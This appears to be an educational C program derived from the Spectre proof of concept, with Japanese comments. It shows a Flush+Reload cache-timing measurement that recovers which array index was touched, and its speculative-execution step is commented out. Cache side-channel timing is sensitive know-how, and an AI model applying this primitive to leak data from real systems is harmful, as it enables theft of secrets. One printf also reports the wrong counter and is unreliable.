#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <x86intrin.h> /* for rdtsc, rdtscp, clflush */

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[16] = {
    1,
    2,
    3,
    4,
    5,
    6,
    7,
    8,
    9,
    10,
    11,
    12,
    13,
    14,
    15,
    16,
};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char *secret = "Spectre Exploit Done, Enable Mitigation!";

uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

void touch_array2(size_t x) {
  // if (x < array1_size) {
  //   temp &= array2[array1[x] * 512];
  // }
  
  // discarded if guard
  temp &= array2[x * 512];
}

void flush_reload(int cache_hit_threshold, size_t secret_x, uint8_t value[2], int score[2], uint64_t counter[256]) {
  static int results[256];
  int i, j, k, mix_i;
  unsigned int junk = 0;
  size_t training_x, x;
  register uint64_t time1, time2;
  volatile uint8_t * addr;

  for (i = 0; i < 256; i++)
    results[i] = 0;

  /* Flush array2[512*(0..255)] from cache */
  for (i = 0; i < 256; i++)
    _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */

  touch_array2(secret_x);

  /* Time reads. Order is lightly mixed up to prevent stride prediction */
  // CPU に先読みされないように読む順番を工夫しているが、
  // これでも256に近い値は先読みされてしまうっぽい。
  for (i = 0; i < 256; i++) {
    mix_i = ((i * 167) + 13) & 255;
    addr = & array2[mix_i * 512];

  /*
  We need to accuratly measure the memory access to the current index of the
  array so we can determine which index was cached by the malicious mispredicted code.

  The best way to do this is to use the rdtscp instruction, which measures current
  processor ticks, and is also serialized.
  
  */

    // メモリアクセスにかかる時間から secret_x を復元する。
    // touch_array2() でアクセスしたアドレスは高速に読めるが、
    // それ以外のアドレスはキャッシュされていないため読むのに時間がかかる。
    time1 = __rdtscp( & junk); /* READ TIMER */
    junk = * addr; /* MEMORY ACCESS TO TIME */
    time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */

    if ((int)time2 <= cache_hit_threshold)
      results[mix_i]++; /* cache hit - add +1 to score for this value */

    counter[mix_i] = time2;
  }

  /* Locate highest & second-highest results results tallies in j/k */
  j = k = -1;
  for (i = 0; i < 256; i++) {
    if (j < 0 || results[i] >= results[j]) {
      k = j;
      j = i;
    } else if (k < 0 || results[i] >= results[k]) {
      k = i;
    }
  }

  results[0] ^= junk; /* use junk so code above won’t get optimized out*/
  value[0] = (uint8_t) j;
  score[0] = results[j];
  value[1] = (uint8_t) k;
  score[1] = results[k];
}

int main(int argc, char** argv) {

  int score[2];
  uint8_t value[2];
  uint64_t counter[256];
  size_t idx = 32;

  // !! IMPORTANT !!
  for (int i = 0; i < (int)sizeof(array2); i++) {
    array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
  }

  if (argc >= 2) {
    sscanf(argv[1], "%ld", &idx);
  }

  // array2[idx * 512] にアクセスし、
  // キャッシュから idx の値を復元・推測する
  flush_reload(80, idx, value, score, counter);

  // 結果の表示
  for (int i = 0; i < 256; i++) {
    printf("array[%3.d * 512]: %ld\n", i, counter[i]);
  }
  printf("\n");

  printf("accessed array[%zu * 512]\n\n", idx);
  printf("Access Time:\n");
  printf("Best   (array[__%3.hhu__ * 512]) : %zu\n", value[0], counter[value[0]]);
  if (score[1] > 0)
    printf("Second (array[__%3.hhu__ * 512]) : %zu\n", value[1], counter[value[0]]);
  printf("\n");

  return 0;
}

